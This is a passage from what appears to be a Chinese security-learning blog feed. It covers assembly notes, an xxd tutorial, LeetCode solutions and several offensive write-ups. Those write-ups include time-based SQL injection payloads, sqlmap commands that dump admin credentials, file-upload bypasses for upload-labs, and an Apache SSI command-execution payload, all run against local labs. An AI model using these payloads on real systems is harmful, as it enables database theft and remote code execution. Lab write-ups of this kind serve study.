;sp=FCH,修改的内存单元地址是220FCH,内容为6021Hpop ax           ;sp=FEH,ax=6021Hpop bx           ;sp=100H,bx=C0FCHpush [4]       ;sp=FEH,修改的内存单元是220FEH,内容为30F0push [6]       ;sp=FCH,修改的内存单元是220FCH,内容为2F31</code></pre><p><img src="/posts/6cc1a5d6/1580653302675.png" alt></p><p>为什么2000:0 ~2000:f 的内容会发生变化？</p><p><img src="/posts/6cc1a5d6/1580653314559.png" alt></p><p>仔细观察发现<br>01A3 不知道是什么，但是0b39和0108确实当前指令的地址，也就是执行完 <code>mov ss,ax mov sp,10H</code> 之后的下一条指令的地址，结合这是在设置栈，不禁想到了函数的压栈，保存了返回地址，但是还有一个 0020 的数据不知道是哪里的</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土一</title>
      <link href="/posts/57418b7f/"/>
      <url>/posts/57418b7f/</url>
      
        <content type="html"><![CDATA[<h2 id="第一、二章"><a href="#第一、二章" class="headerlink" title="第一、二章"></a>第一、二章</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>一个存储单元一般存储 1个字节，也就是8个二进制位</p><p>一个字为两个字节</p><p>地址总线：用来寻址，由于一根地址总线只能表示2个状态，所以一个CPU有N根地址线，则可以说这个CPU的地址总线宽度为N，这样的CPU最多可以寻找 $2^{N}$ 个内存单元</p><p>数据总线：数据总线的宽度意味着CPU一次能传输多少位数据</p><p>控制总线：控制总线的宽度决定了CPU对外部器件的控制能力</p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>通用寄存器中，AX可以拆分为 AH和AL，如果单独使用AH或者AL，则应该看成一个独立的8位寄存器来使用，AH和AL此时是不相关的</p><p>如何寻址？<br><img src="/posts/57418b7f/1580566042011.png" alt></p><p>注意此时并不是操作系统中学到的分段，只是这么用罢了</p><p>一个 ‘段’ 的偏移占16位，那么一个段的长度最大为64KB</p><p>不同的段地址和偏移地址可以形成同一个物理地址</p><p>CS:IP 指向的内容就是将要执行的指令(但是CPU是怎么知道指令的长度的呢，x86是变长的，而MIPS是等长的，这个坑之后说)</p><p>基础指令 mov,add,jmp</p><p>mov指令设置寄存器的内容值，add执行加法，jmp设置cs和ip的值</p><p>四条指令完成计算2的4次方</p><pre><code class="x86asm">mov ax,2add ax,axadd ax,axadd ax,ax</code></pre><p>当然也可以使用jmp指令，但是你无法判定程序什么时候退出(因为指令不够hhhh)</p><h2 id="dosbox使用"><a href="#dosbox使用" class="headerlink" title="dosbox使用"></a>dosbox使用</h2><p>dosbox可以用来模拟dos环境，然后我们下载一个MASM工具包，里面包含了 <code>debug</code> 这些程序</p><p>注意设置dosbox</p><pre><code>[autoexec]# Lines in this section will be run at startup.# You can put your MOUNT lines here.mount C: G:\MASMC:</code></pre><p>因为我的 MASM 工具包位于 G盘目录下，所以设置挂载命令<br>这样打开dosbox之后自动挂载</p><p><img src="/posts/57418b7f/1580565800214.png" alt></p><h2 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h2><p>debug.exe 使用<br>r 命令可以查看寄存器内容，以及当前的 cs:ip 指向，还有ds指向的内容</p><p><img src="/posts/57418b7f/1580565809854.png" alt></p><p>还可以修改寄存器的内容</p><p><img src="/posts/57418b7f/1580565820000.png" alt></p><p>使用d命令查看内存</p><p><code>d1000:9</code></p><p><img src="/posts/57418b7f/1580565830704.png" alt></p><p>查看某一个范围内的内存</p><p><code>d1000:9 20</code></p><p><img src="/posts/57418b7f/1580565845701.png" alt></p><p>e 命令可以修改内存的数据</p><p><code>e1000:0 0 1 2 3 4 5 7 8</code></p><p><img src="/posts/57418b7f/1580565854260.png" alt></p><p>当然也可以换一种方式修改</p><p><img src="/posts/57418b7f/1580565864064.png" alt></p><p>也可以向其中写入字符串</p><p><img src="/posts/57418b7f/1580565875753.png" alt></p><p>尝试写入一段汇编指令</p><p><img src="/posts/57418b7f/1580565886857.png" alt></p><p>使用 e命令编辑内存，然后使用 u 命令反汇编</p><p><img src="/posts/57418b7f/1580565897644.png" alt></p><p>那么如何执行汇编指令呢？</p><p>首先用 r 设置 cs 和 ip的值，然后使用 t 就可以执行汇编指令了，可以看到执行了三条汇编指令后的结果， ax 存储了 0x03   cx 存储了 0x02</p><p><img src="/posts/57418b7f/1580565906622.png" alt></p><p>直接使用 e 命令编辑当然不方便，于是可以用 a 命令直接书写汇编指令，然后自动的给转化成对应的机器码</p><p><img src="/posts/57418b7f/1580565914978.png" alt></p><h2 id="实验任务"><a href="#实验任务" class="headerlink" title="实验任务"></a>实验任务</h2><ol><li>使用debug将下面的程序写入内存，逐条执行</li></ol><p><img src="/posts/57418b7f/1580565925422.png" alt></p><p>汇编指令输入到内存中</p><p><img src="/posts/57418b7f/1580565937645.png" alt></p><p>然后运行就是的了</p><ol start="2"><li>将下面3条指令写入到 2000:0 开始的内存单元中，计算2的次方</li></ol><pre><code class="x86asm">mov ax,1add ax,axjmp 2000:0003</code></pre><p>运行过程截图</p><p><img src="/posts/57418b7f/1580565948449.png" alt></p><ol start="3"><li>PC 机主板上的ROM有一个生产日期，在内存 FFF00H~FFFFFH 的某几个单元中，请找到这个生产日期并试图改变它</li></ol><p><img src="/posts/57418b7f/1580565963720.png" alt></p><p>很显然我是改不了的</p><p><img src="/posts/57418b7f/1580565972814.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
            <tag> dosbox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计初尝</title>
      <link href="/posts/728b20a1/"/>
      <url>/posts/728b20a1/</url>
      
        <content type="html"><![CDATA[<h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>文件删除函数只考虑到了白名单路径，但是没有想到 <code>../</code></p><pre><code class="php">function del_file(){    $path = post(&#39;path&#39;);    $path = str_replace(&#39;../&#39;,&#39;&#39;,$path);    $dir[0] = &#39;data/backup/&#39;;    $dir[1] = &#39;images/&#39;;    $dir[2] = &#39;resource/&#39;;    $flag = false;    for($i = 0; $i &lt; count($dir); $i ++)    {        if(substr($path,0,strlen($dir[$i])) == $dir[$i])        {            $flag = true;        }    }    if($flag)    {        if(unlink($path))        {            $result = 1;        }    }    echo isset($result) ? $result : 0;}</code></pre><p>根目录新建 aaaa.txt<br>然后发送请求<br><img src="/posts/728b20a1/1580563907589.png" alt></p><p>成功删除文件</p><h2 id="后台注入"><a href="#后台注入" class="headerlink" title="后台注入"></a>后台注入</h2><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p><code>or if(length(database())=6,sleep(3),0)</code><br>如果数据库名的长度为6，那么就 <code>sleep(3)</code><br>我测试的时候数据库名为 <code>xinxiu</code> ，所以就会出现一定的延时</p><p><img src="/posts/728b20a1/1580563920089.png" alt></p><p>延时注入的其他例子</p><pre><code># 判断当前数据库长度 # 当前数据库长度是否为 1 没有延时 不是 cmd=del_admin&amp;id=3 or if(length(database())=1,sleep(3),0) # 延时 表明当前数据库长度为 6 cmd=del_admin&amp;id=3 or if(length(database())=6,sleep(3),0) # 当前数据库第1个字母的ascii码是否为 97 没有延时 不是 cmd=del_admin&amp;id=3 or if(ascii(mid(database(),1,1))=97,sleep(3),0) # 延时 表明当前数据库第1个字母的ascii码为 115 即 &#39;s&#39; cmd=del_admin&amp;id=3 or if(ascii(mid(database(),1,1))=115,sleep(3),0) # 当前数据库第2个字母的ascii码是否为 97 没有延时 不是 cmd=del_admin&amp;id=3 or if(ascii(mid(database(),2,1))=97,sleep(3),0) # 延时 表明当前数据库第2个字母的ascii码为 105 即 &#39;i&#39; cmd=del_admin&amp;id=3 or if(ascii(mid(database(),2,1))=105,sleep(3),0) ...</code></pre><p>注意这里不能用 and ,因为这个 id=3 的用户实际上不存在，所以就不再需要去执行 and 另一边的语句了(短路！)</p><p>但是如果这个用户存在当然是可以的咯(那样注入就很麻烦了)</p><p><img src="/posts/728b20a1/1580563976163.png" alt></p><p>但是我按照国光的方法使用 sqlmap 失败了</p><pre><code>./sqlmap.py -u &quot;http://127.0.0.1/admin.php?/deal/dir-basic/&quot; --cookie=&quot;qaq21129s234bj1q4ammcs7fe5;&quot; --data=&quot;cmd=del_admin&amp;id=3&quot; -p &quot;id&quot; --technique=T --random-agent -v 3 --tamper=&quot;between&quot; -D &#39;sinsiu&#39; -T &#39;php_admin&#39; -C &#39;adm_id,adm_username,adm_password&#39; --dump</code></pre><p><img src="/posts/728b20a1/1580563990735.png" alt></p><h3 id="另一处后台注入"><a href="#另一处后台注入" class="headerlink" title="另一处后台注入"></a>另一处后台注入</h3><p><code>search_main.php</code> 文件</p><pre><code class="php">    $global[&#39;key&#39;] = rawurldecode($global[&#39;key&#39;]);    $obj = new goods();    $obj-&gt;set_field(&#39;goo_id,goo_title,goo_x_img&#39;);    $obj-&gt;set_where(&quot;goo_title like &#39;%&quot; . $global[&#39;key&#39;] . &quot;%&#39;&quot;);    $obj-&gt;set_where(&#39;goo_channel_id = &#39;.get_id(&#39;channel&#39;,&#39;cha_code&#39;,&#39;goods&#39;));</code></pre><p>这里忘记过滤了</p><pre><code class="php">$obj-&gt;set_where(&quot;goo_title like &#39;%&quot; . $global[&#39;key&#39;] . &quot;%&#39;&quot;);</code></pre><p><img src="/posts/728b20a1/1580564002356.png" alt></p><p>同样的尝试使用 <code>sqlmap</code> 但是还是失败了(怕是个假的吧)</p><pre><code> ./sqlmap.py -u &quot;http://localhost/?/search/index.html/key-%27*%20%23/&quot; -v 3 --technique=T -D &#39;sinsiu&#39; -T &#39;php_admin&#39; -C &#39;adm_id,adm_username,adm_password&#39; --dump</code></pre><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><code>admin/basic_func.php</code> 中：</p><p><code>$global[&#39;channel&#39;]</code> 参数可控，比如访问 <code>/admin.php?/service/mod-user_sheet/</code>,那么获取到的是 <code>service</code> ，之后判断文件是否存在进行包含</p><pre><code class="php">    global $global;    $global = array();    var_dump($_SERVER[&#39;QUERY_STRING&#39;]);    $global[&#39;url&#39;] = $filter($_SERVER[&#39;QUERY_STRING&#39;]);    if($global[&#39;url&#39;] != &#39;&#39;)    {        $arr = explode(&#39;/&#39;,$global[&#39;url&#39;]); //以 / 做分隔符        $global[&#39;channel&#39;] = $arr[1];        var_dump($global);</code></pre><p><img src="/posts/728b20a1/1580564015011.png" alt></p><pre><code class="php">function main(){    global $global,$smarty;    set_global();    include_all(&#39;admin/class&#39;);    set_more_global();    $path = &#39;admin/admin.php&#39;;    if($global[&#39;url&#39;] != &#39;&#39;)    {        $path2 = &#39;admin/&#39;.$global[&#39;channel&#39;].&#39;.php&#39;; //获取到 $global[&#39;channel&#39;] 这个参数可控        var_dump(file_exists($path2));        if(file_exists($path2))        {            $path = $path2;        }    }    include($path);}</code></pre><p>但是这里如果传入 <code>../</code> 那么就会导致 <code>file_exists</code> 返回错误，所以暂时无能为力</p><p><code>admin/common.func.php</code> 文件中</p><pre><code class="php">function run($parameter){    global $smarty;    $path = &#39;&#39;;    $display = &#39;&#39;;    extract($parameter); //extract函数存在变量覆盖，但是参数不可控    $func = &#39;module_&#39;.$module;    include(&#39;admin/module/&#39;.$path.$module.&#39;.php&#39;);    $func($parameter);    if($display != &#39;no&#39;)    {        $smarty-&gt;display(&#39;module/&#39;.$path.$module.&#39;.php&#39;);    }}</code></pre><h2 id="任意写文件"><a href="#任意写文件" class="headerlink" title="任意写文件"></a>任意写文件</h2><p><code>common.func.php</code> 存在一处编辑配置文件</p><p><img src="/posts/728b20a1/1580564028890.png" alt></p><p>当然此处是可以随意修改文件的，只是没办法写shell</p><p><img src="/posts/728b20a1/1580564041634.png" alt></p><p>可见过滤还是挺严格的</p><p><img src="/posts/728b20a1/1580564050184.png" alt></p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p><code>getRemoteImage.php</code> 文件中，</p><p>可以获取远程图片</p><p>首先必须是 http开头的</p><pre><code class="php">if(strpos($imgUrl,&quot;http&quot;)!==0){                array_push( $tmpNames , &quot;error&quot; );                continue;            }</code></pre><p>校验了后缀名</p><pre><code class="php">            $fileType = strtolower( strrchr( $imgUrl , &#39;.&#39; ) );            if ( !in_array( $fileType , $config[ &#39;allowFiles&#39; ] ) || stristr( $heads[ &#39;Content-Type&#39; ] , &quot;image&quot; ) ) {                array_push( $tmpNames , &quot;error&quot; );                continue;            }</code></pre><p>相关的白名单</p><pre><code class="php">    $config = array(        &quot;savePath&quot; =&gt; &quot;../../images/editor/&quot; ,            //保存路径        &quot;allowFiles&quot; =&gt; array( &quot;.gif&quot; , &quot;.png&quot; , &quot;.jpg&quot; , &quot;.jpeg&quot; , &quot;.bmp&quot; ) , //文件允许格式        &quot;maxSize&quot; =&gt; 30000                    //文件大小限制，单位KB    );</code></pre><p>之后会读取文件</p><pre><code class="php">readfile( $imgUrl,false,$context);</code></pre><p>这么看来感觉问题不大</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-21" target="_blank" rel="noopener">PHP代码审计初尝</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-xxd</title>
      <link href="/posts/2e8d4a2a/"/>
      <url>/posts/2e8d4a2a/</url>
      
        <content type="html"><![CDATA[<h2 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h2><p>基本选项</p><ul><li>-a : 它的作用是自动跳过空白内容，默认是关闭的</li><li>-c : 它的后面加上数字表示每行显示多少字节的十六进制数，默认是16字节。</li><li>-g : 设定以几个字节为一块，默认为2字节。</li><li>-l : 显示多少字节的内容。</li><li>-s : 后面接【+-】和address.加号表示从地址处开始的内容，减号表示距末尾address开始的内容。</li><li>-ps: output in postscript plain hexdump style</li></ul><p>xxd 是有单位的，如</p><p><img src="/posts/2e8d4a2a/1580557821863.png" alt></p><p>和</p><p><img src="/posts/2e8d4a2a/1580557833258.png" alt></p><p>很显然其中一个 0x100 是 256个字节，也就是16行咯</p><h3 id="g-选项的含义"><a href="#g-选项的含义" class="headerlink" title="-g 选项的含义"></a>-g 选项的含义</h3><p>默认是两个字节一组</p><pre><code class="bash">$ xxd -s -100 -l 0x20 monster.jpg00002601: eeae ee33 b2ae ae9b b979 0eb8 e171 a040  ...3.....y...q.@00002611: 2146 78f7 d5a0 fef0 79e7 5135 fbf5 7f48  !Fx.....y.Q5...H</code></pre><p>通过 -g 变为一个字节一组</p><pre><code class="bash">$ xxd -s -100 -l 0x20  -g 1 monster.jpg 00002601: ee ae ee 33 b2 ae ae 9b b9 79 0e b8 e1 71 a0 40  ...3.....y...q.@00002611: 21 46 78 f7 d5 a0 fe f0 79 e7 51 35 fb f5 7f 48  !Fx.....y.Q5...H</code></pre><h2 id="其他用法"><a href="#其他用法" class="headerlink" title="其他用法"></a>其他用法</h2><p>如果我只想要十六进制,加上 -ps 选项</p><pre><code class="bash">$ xxd -s -100 -l 0x20  -g 1  -ps monster.jpg eeaeee33b2aeae9bb9790eb8e171a040214678f7d5a0fef079e75135fbf57f48</code></pre><p>​    可以输出C语言数组形式</p><pre><code class="bash">$ xxd -s -100 -l 0x20  -g 1 -i  monster.jpg unsigned char monster_jpg[] = {  0xee, 0xae, 0xee, 0x33, 0xb2, 0xae, 0xae, 0x9b, 0xb9, 0x79, 0x0e, 0xb8,  0xe1, 0x71, 0xa0, 0x40, 0x21, 0x46, 0x78, 0xf7, 0xd5, 0xa0, 0xfe, 0xf0,  0x79, 0xe7, 0x51, 0x35, 0xfb, 0xf5, 0x7f, 0x48};unsigned int monster_jpg_len = 32;</code></pre><h2 id="与vim结合"><a href="#与vim结合" class="headerlink" title="与vim结合"></a>与vim结合</h2><p><code>vim 文件名 -b</code> 以二进制方式打开文件</p><p>然后输入命令 <code>%!xxd</code></p><p>就可以进入到十六进制编辑模式</p><p>编辑完之后需要用 <code>%!xxd -r</code> 保存，退回到原来的vim模式</p><h2 id="反向dump"><a href="#反向dump" class="headerlink" title="反向dump"></a>反向dump</h2><pre><code class="bash"># pxy @ LAPTOP-UBIEP4K5$ xxd monster.jpg file.dump# pxy @ LAPTOP-UBIEP4K5$ head -n 4 file.dump 00000000: ffd8 ffe0 0010 4a46 4946 0001 0100 0001  ......JFIF......00000010: 0001 0000 ffdb 0043 0008 0606 0706 0508  .......C........00000020: 0707 0709 0908 0a0c 140d 0c0b 0b0c 1912  ................00000030: 130f 141d 1a1f 1e1d 1a1c 1c20 242e 2720  ........... $.&#39;# pxy @ LAPTOP-UBIEP4K5 $ xxd -r file.dump &gt; a.jpg# pxy @ LAPTOP-UBIEP4K5 $ file a.jpg a.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 160x247, components 3</code></pre><p>这样比较方便，可以转成其他文件，进行编辑之后再转回来，本质上和vim一起用的效果一样</p><p>​        </p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxd </tag>
            
            <tag> hexdump </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天以一道leetcode-链表题</title>
      <link href="/posts/2e6a5f8a/"/>
      <url>/posts/2e6a5f8a/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>safeharbor靶机渗透</title>
      <link href="/posts/1f38a4f2/"/>
      <url>/posts/1f38a4f2/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>upload-lab做题笔记</title>
      <link href="/posts/5877398d/"/>
      <url>/posts/5877398d/</url>
      
        <content type="html"><![CDATA[<h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>这个算是逻辑漏洞了<br>reset 函数重置当前指针， end指向最后一个元素，这个最后并不是指最后的，而是最后加入数组的元素</p><pre><code class="php">php &gt; $a = array(1,2,3,4,5);php &gt; current($a);php &gt; echo current($a);1php &gt; echo next($a);2php &gt; echo current($a);2php &gt; echo end($a);5php &gt; echo current($a);5php &gt; echo reset($a);1php &gt; echo current($a);</code></pre><p>于是这样就可以理解了</p><p><img src="/posts/5877398d/1580398124587.png" alt></p><p>关键就在于用户可以控制这个文件名</p><pre><code class="php">$file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;];if (!is_array($file)) {    $file = explode(&#39;.&#39;, strtolower($file));}var_dump($file);$ext = end($file);var_dump($ext);$allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);if (!in_array($ext, $allow_suffix)) {    $msg = &quot;禁止上传该后缀文件!&quot;;}else{    $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;    if (move_uploaded_file($temp_file, $img_path)) {        $msg = &quot;文件上传成功！&quot;;        $is_upload = true;    } else {</code></pre><p>同时也要熟悉文件上传的数据包，复习了一遍 POST 方式传递数组同时可以规定元素的顺序</p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>CVE-2015-2348 利用即可</p><p><img src="/posts/5877398d/1580398163615.png" alt></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>这一关代码很多，最后没想到是通过条件竞争来达到目的</p><p>但是由于限制了后缀名，参考了很多博客都是利用 apache 解析漏洞</p><p><img src="/posts/5877398d/1580564170919.png" alt></p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>也是一个条件竞争的，关键代码:</p><pre><code class="php">    if(move_uploaded_file($temp_file, $upload_file)){        if(in_array($file_ext,$ext_arr)){             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;             rename($upload_file, $img_path);             $is_upload = true;        }else{            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;            unlink($upload_file);</code></pre><p>我们上传一个 <code>shell.php</code><br>内容为：</p><pre><code class="php">&lt;?php file_put_contents(&quot;info.php&quot;, &quot;&lt;?php phpinfo(); ?&gt;&quot;)?&gt;</code></pre><p>之后去访问这个文件，就能生成 info.php</p><p><img src="/posts/5877398d/1580564183356.png" alt></p><p>还有一种方式先上传 <code>shell.php:.jpg</code> 绕过限制</p><p><img src="/posts/5877398d/1580564192098.png" alt></p><p>这样会生成 <code>shell.php</code> 的空文件，然后利用Windows的特性,尽管上传的文件被删除了，但是依旧覆盖了原有的文件</p><p><img src="/posts/5877398d/1580564202994.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php常用函数</title>
      <link href="/posts/3d16ce36/"/>
      <url>/posts/3d16ce36/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞复现-Apache SSI远程命令执行</title>
      <link href="/posts/becfc22d/"/>
      <url>/posts/becfc22d/</url>
      
        <content type="html"><![CDATA[<h2 id="SSI远程命令执行"><a href="#SSI远程命令执行" class="headerlink" title="SSI远程命令执行"></a>SSI远程命令执行</h2><p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用 <code>&lt;!--#exec cmd=”id” --&gt;</code> 语法执行命令。</p><blockquote><p>shtml 不是 html 而是一种服务器 API,shtml 是服务器动态产生的 htm<br>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p></blockquote><p><img src="/posts/becfc22d/1580369820917.png" alt></p><p>上传之后，点击即可</p><p><img src="/posts/becfc22d/1580369831464.png" alt></p><p>可以尝试上传 shtml 文件来达到getshell的目的</p><p><img src="/posts/becfc22d/1580369842405.png" alt></p><h2 id="CVE-2017-15715-换行符截断"><a href="#CVE-2017-15715-换行符截断" class="headerlink" title="CVE-2017-15715 换行符截断"></a>CVE-2017-15715 换行符截断</h2><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A<br>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p>发送文件上传数据包</p><p><img src="/posts/becfc22d/1580371055451.png" alt></p><p>需要添加一个 <code>\x0a</code></p><p><img src="/posts/becfc22d/1580371064625.png" alt></p><p>上传后解析成功</p><p><img src="/posts/becfc22d/1580371072709.png" alt></p><p>ps:也不知道如何构造文件上传数据包，我是写了一个表单来完成的,然后将相关的参数做一些修改即可</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://192.168.99.100:8080/index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>环境中处理文件上传的代码:</p><pre><code class="php">&lt;?phpif(isset($_FILES[&#39;file&#39;])) {    $name = basename($_POST[&#39;name&#39;]);    $ext = pathinfo($name,PATHINFO_EXTENSION);    if(in_array($ext, [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;])) {        exit(&#39;bad file&#39;);    }    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#39;./&#39; . $name);</code></pre><h2 id="CVE-2015-2348-php任意文件上传"><a href="#CVE-2015-2348-php任意文件上传" class="headerlink" title="CVE-2015-2348 php任意文件上传"></a>CVE-2015-2348 php任意文件上传</h2><p>漏洞影响版本必须在5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7，详见CVE公告：<a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348" target="_blank" rel="noopener">https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348</a><br>这个漏洞的利用条件比较苛刻，尝试用 php5.5.9 nts 测试没有成功<br>并且测试的时候发现</p><p><img src="/posts/becfc22d/1580397902588.png" alt></p><p>尽管加上了 \x00 但是实际上通过</p><pre><code class="php">$uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];var_dump($uploaded_name);</code></pre><p>获取到的文件名并不会包含 <code>.jpg</code><br>这里就涉及到数据的获取问题了</p><p>文件上传的数据包可以分成这几个部分：</p><p><img src="/posts/becfc22d/1580397931674.png" alt></p><p>第一部分是会存储到 <code>$_FILES</code> 数字中，并且 <code>name</code> 是用来和后端交互的， <code>filename</code> 是固定的一个名字，后端通过 <code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code> 来得到<br>第二部分的数据是存储到 <code>$_POST</code> 和 <code>$_REQUEST</code> 数组中的</p><p><img src="/posts/becfc22d/1580397942131.png" alt></p><p>既然如此，那我就直接写死 <code>$target_path .= &quot;aaa.php\x00.jpg&quot;;</code> 即可进行测试</p><p> php 5.2.17 可以</p><p><img src="/posts/becfc22d/1580397968376.png" alt></p><p>php5.5.9 也可以</p><p><img src="/posts/becfc22d/1580397984801.png" alt></p><p>如果换成 php 7.3.4 nts 、5.3.29、5.4.45、5.6.9则报错</p><p><img src="/posts/becfc22d/1580397995259.png" alt></p><h3 id="漏洞原因："><a href="#漏洞原因：" class="headerlink" title="漏洞原因："></a>漏洞原因：</h3><p>php在5.6.6中将长度比较的安全检查逻辑给去掉了</p><p><img src="/posts/becfc22d/1580398009005.png" alt></p><p>原来有安全检查的代码是这样子的：</p><p><img src="/posts/becfc22d/1580398026408.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/cyjaysun/p/4390930.html" target="_blank" rel="noopener">https://www.cnblogs.com/cyjaysun/p/4390930.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> Apache </tag>
            
            <tag> RCE </tag>
            
            <tag> SSI </tag>
            
            <tag> 截断 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一道leetcode-数组题</title>
      <link href="/posts/734660ee/"/>
      <url>/posts/734660ee/</url>
      
        <content type="html"><![CDATA[<h2 id="整数转罗马数字"><a href="#整数转罗马数字" class="headerlink" title="整数转罗马数字"></a>整数转罗马数字</h2><p>题目虽然不难，但是也整了好久，后来才明白转成罗马数字就是不断地做除法和模</p><p>但是我这里遇到了一个问题，python中的字典本来是无序的，所以我就拆成了两个list来存放</p><pre><code class="python">class Solution(object):    def intToRoman(self, num):        &quot;&quot;&quot;        :type num: int        :rtype: str        &quot;&quot;&quot;        result = &#39;&#39;        nums = [1000,900,500,400,100,90,50,40,10,9,5,4,1]        chars = [&#39;M&#39;,&#39;CM&#39;,&#39;D&#39;,&#39;CD&#39;,&#39;C&#39;,&#39;XC&#39;,&#39;L&#39;,&#39;XL&#39;,&#39;X&#39;,&#39;IX&#39;,&#39;V&#39;,&#39;IV&#39;,&#39;I&#39;]        for i in nums:            x = num // i            num = num % i            result += x*chars[nums.index(i)]        return result</code></pre><p>这样当然是没问题得，但是我看到评论区居然有人用python的字典也成功了</p><p>这就很疑惑了，于是我修改了代码：</p><pre><code class="python">class Solution(object):    def intToRoman(self, num):        &quot;&quot;&quot;        :type num: int        :rtype: str        &quot;&quot;&quot;        result = &quot;&quot;        roman = {1000:&#39;M&#39;,900:&#39;CM&#39;, 500:&#39;D&#39;, 400:&#39;CD&#39;, 100:&#39;C&#39;,90:&#39;XC&#39;, 50:&#39;L&#39;, 40: &#39;XL&#39;,10:&#39;X&#39;,9:&#39;IX&#39;, 5:&#39;V&#39;,4:&#39;IV&#39;, 1:&#39;I&#39;}        for i in roman:            x = num // i            num = num % i            result += x*roman[i]        return result</code></pre><p>居然也过了！！！</p><p>难道leetcode的python解释器不一样？</p><p><img src="/posts/734660ee/1580397588462.png" alt></p><h2 id="罗马数字转整数"><a href="#罗马数字转整数" class="headerlink" title="罗马数字转整数"></a>罗马数字转整数</h2><p>这个题目就更妙了，秒就妙在对于哈希表的处理上</p><p>如果是我想的话，只需要将上个题的哈希表倒过来就行了，但是实际上我们可以这样做：</p><pre><code class="python">d = {&#39;I&#39;:1, &#39;IV&#39;:3, &#39;V&#39;:5, &#39;IX&#39;:8, &#39;X&#39;:10, 